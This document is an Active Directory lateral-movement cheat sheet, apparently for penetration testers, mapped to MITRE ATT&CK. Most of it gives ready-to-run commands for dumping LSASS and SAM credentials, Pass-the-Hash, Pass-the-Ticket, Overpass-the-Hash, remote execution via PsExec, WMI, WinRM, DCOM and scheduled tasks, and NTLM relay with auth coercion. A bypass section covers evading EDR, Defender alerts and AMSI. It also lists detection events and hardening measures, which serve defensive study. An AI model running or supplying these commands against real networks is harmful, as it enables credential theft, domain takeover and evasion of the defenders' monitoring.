# Active Directory Lateral Movement

> Pass-the-Hash (PtH), Pass-the-Ticket (PtT), Overpass-the-Hash, PsExec/WMI/WinRM/DCOM execution. Authorized testing only. Map: MITRE ATT&CK Lateral Movement (TA0008).

## TL;DR
- "Lateral movement" = code execution on another host using credentials/tickets harvested from the current host. Authentication happens over SMB/RPC/WMI/WinRM; execution happens via a service, scheduled task, WMI process, or PSRemoting.
- Two credential primitives drive everything: **NTLM hash** (Pass-the-Hash) and **Kerberos ticket** (Pass-the-Ticket / Overpass-the-Hash).
- Detection-wise: PsExec leaves a service install event (4697) + a SMB connection (4624 type 3) — loud. WMI and WinRM are quieter but logged. Skilled defenders alert on ANY admin login outside change windows.
- Tier-0 hygiene blocks most of this — domain admins should never touch user-tier hosts.

## Detection / Discovery

### From a foothold — what does the user have?
| Command | Description |
| --- | --- |
| `whoami /all` | Current SID, group memberships, integrity level |
| `net group "Domain Admins" /domain` | Verify DA membership |
| `Get-DomainController -Domain <domain>` | DC list (PowerView) |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse` | Walk DA membership |
| `Find-LocalAdminAccess -Verbose` (PowerView) | Hosts where current user has admin |
| `nxc smb <subnet> -u <user> -p <pass> --gen-relay-list relays.txt` | Map admin-rights across the network with NetExec |

### Credential extraction (post-admin)
| Tool | What |
| --- | --- |
| `mimikatz` `sekurlsa::logonpasswords` | LSASS in-memory NTLM / Kerberos / DPAPI |
| `mimikatz` `lsadump::sam` (post-SYSTEM) | Local SAM hashes |
| `secretsdump.py <domain>/<user>:<pass>@<host>` | Remote NTDS / SAM / LSA via DCOM/SMB |
| `procdump64 -ma lsass.exe lsass.dmp` then `pypykatz lsa minidump lsass.dmp` | Less-noisy LSASS extraction (PtH on minidump done offline) |
| `dpapi-ng` / `mimikatz dpapi::*` | DPAPI-protected blobs (Chrome passwords, RDP MAN/CRED) |

### Useful target classes (per-host)
- "Computer with cached DA login" → unconstrained delegation cascade or LSASS dump.
- "Computer with SQL Service Account → linked-server chain" → see [./kerberos.md](./kerberos.md) constrained-delegation section.
- "Computer in `Domain Computers` with WriteACL on TARGET$" → RBCD chain.
- "Server Operators / Backup Operators member" → Tier-0 equivalent via service install / NTDS backup.

## Exploitation

### Pass-the-Hash (PtH) — NTLM credential reuse
The Windows NTLM challenge/response only needs the NT hash, not the password. So a captured hash is as good as a password for any NTLM-accepting service.
```bash
# Impacket — execute via SMB ADMIN$ share install (PsExec-style)
psexec.py -hashes :<NTLM> <domain>/<user>@<target>

# Or via WMI (quieter — no service install event 4697)
wmiexec.py -hashes :<NTLM> <domain>/<user>@<target>

# Or via DCOM (different event trail)
dcomexec.py -hashes :<NTLM> <domain>/<user>@<target>

# NetExec — sweep many hosts at once
nxc smb <subnet> -u <user> -H <NTLM> --shares
nxc smb <subnet> -u <user> -H <NTLM> -x 'whoami'   # exec via WMI
```

### Pass-the-Ticket (PtT) — reuse a TGT or TGS
With a `.ccache` / `.kirbi` from `secretsdump`, `Rubeus`, `mimikatz sekurlsa::tickets /export`, or `getTGT.py`:
```bash
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass <user>@<target>
secretsdump.py -k -no-pass <user>@<target>
```
On Windows:
```
mimikatz # kerberos::ptt admin.kirbi
mimikatz # misc::cmd      # spawn cmd with the loaded ticket
```

### Overpass-the-Hash (Pass-the-Key)
Use an NTLM hash to obtain a TGT (Kerberos), then use the TGT (PtT). Lets PtH cross into Kerberos-only environments where NTLM is disabled.
```bash
getTGT.py <domain>/<user> -hashes :<NTLM>
export KRB5CCNAME=<user>.ccache
psexec.py -k -no-pass <user>@<target>
```

### PsExec (Sysinternals) — classic via SMB
- Authenticates over SMB (port 445).
- Installs a service named `PSEXESVC` on the target.
- Generates events: 4624 (type 3 logon), 4672 (privileges assigned), 4697 (service installed), 7045 (service install in System log).
```cmd
PsExec64.exe \\target -u <domain>\<user> -p <pass> -s cmd
```

### WMI — `wmic` / `Invoke-WMIMethod` / Impacket wmiexec
Quieter than PsExec — no service install, but events 4648 (explicit cred logon), 5145 (file share access), and DCOM event 10148 fire.
```bash
wmiexec.py <domain>/<user>:<pass>@<target>
# Or PowerShell:
Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName <target> -ArgumentList "cmd /c whoami > C:\out.txt" -Credential $cred
```

### WinRM — `winrs` / `Enter-PSSession` / `evil-winrm`
WinRM-enabled hosts (5985/HTTP, 5986/HTTPS) accept PowerShell remoting. Logged as event 4624 + 4103 / 4104 (Module/Script Block Logging if enabled).
```bash
evil-winrm -i <target> -u <user> -p <pass>
# Or with hash (NTLM):
evil-winrm -i <target> -u <user> -H <NTLM>
```

### DCOM — `dcomexec.py`
Abuses MMC20.Application / ShellWindows / ShellBrowserWindow CLSIDs. Less commonly audited.
```bash
dcomexec.py <domain>/<user>:<pass>@<target>
```

### Scheduled tasks
```bash
schtasks /create /s <target> /tn pwn /tr "powershell -enc <b64>" /sc once /st 00:00 /ru SYSTEM /u <domain>\<user> /p <pass>
schtasks /run /s <target> /tn pwn /u <domain>\<user> /p <pass>
```

### NTLM Relay (when SMB signing is off)
A user authenticating to attacker-controlled SMB → relay their NTLM challenge to a third host where they have rights.
```bash
# Listener
ntlmrelayx.py -tf targets.txt -smb2support --no-smb-server
# Coerce auth via Petitpotam / PrinterBug / DFSCoerce
PetitPotam.py <attacker> <target>
```
Defence: SMB signing required ([Policy: Microsoft network server: Digitally sign communications]), LDAP signing + LDAPS channel binding, Extended Protection for Authentication on AD CS web enrollment (ESC8 mitigation).

## Bypasses
- **EDR memory-scan**: dump LSASS via uncommon paths — `procdump`-as-LOLBAS, `Comsvcs.dll MiniDump`, `nanodump` (BOF), or via the `RtlpGetMethodCallByName` path. Then PtH on the minidump offline (pypykatz).
- **Defender ATP "credential-theft" alerts**: many trigger on `sekurlsa::logonpasswords`. Try `safetykatz`, `mimikatz` recompiled with strings obfuscation, or `nanodump --write` then offline parse.
- **AMSI on PowerShell**: in-memory AMSI bypass before running PowerView / Rubeus, or run from C# Reflection.Assembly.Load.
- **Constrained Language Mode** on AppLocker'd hosts: fall back to .NET reflective load via SharpHound.exe binary.

## Defence / Remediation
- **Tier-0 / Tier-1 / Tier-2 separation** (Microsoft's Privileged Access strategy): DAs only sign in to DCs, never to user workstations; per-tier credentials non-fungible.
- **Credential Guard** on Windows 10+ / Server 2016+ — LSASS secrets isolated in VSM; PtH/PtT from memory broken on those hosts.
- **Protected Users** group (KB) — disables NTLM, RC4 Kerberos, delegation, and DCR for members.
- **LSA Protection** (`RunAsPPL=1`) — only signed processes can read LSASS memory.
- **SMB signing required** on all DCs and member servers; LDAP signing + channel binding required.
- **Disable NTLMv1** entirely; restrict NTLMv2 to specific scenarios; prefer Kerberos.
- **EDR with LSASS handle telemetry** + alerting on `process_access` to LSASS by non-Microsoft processes.
- **Audit policy** capturing event 4624 (type 3 = network, type 10 = RDP), 4648, 4672, 4688 (process create with cmdline), 4697/7045 (service install), 4103/4104 (PowerShell), 5145 (file share access).
- **Honey credentials** — fake DA-class accounts whose use anywhere triggers high-fidelity alert.
- **Just-Enough-Admin (JEA)** + Just-In-Time (JIT) elevation for admin tasks.

## Sources
- Microsoft — Privileged Access strategy: https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-strategy
- Microsoft — Credential Guard: https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/
- HackTricks Lateral Movement: https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/index.html
- ired.team — Lateral movement: https://www.ired.team/offensive-security/lateral-movement
- SpecterOps Privilege Path Whitepaper: https://posts.specterops.io/
- Microsoft — NTLM Relay Mitigations / EPA: https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview
- Impacket: https://github.com/fortra/impacket
- evil-winrm: https://github.com/Hackplayers/evil-winrm
- nanodump: https://github.com/fortra/nanodump
- MITRE ATT&CK Lateral Movement (TA0008): https://attack.mitre.org/tactics/TA0008/
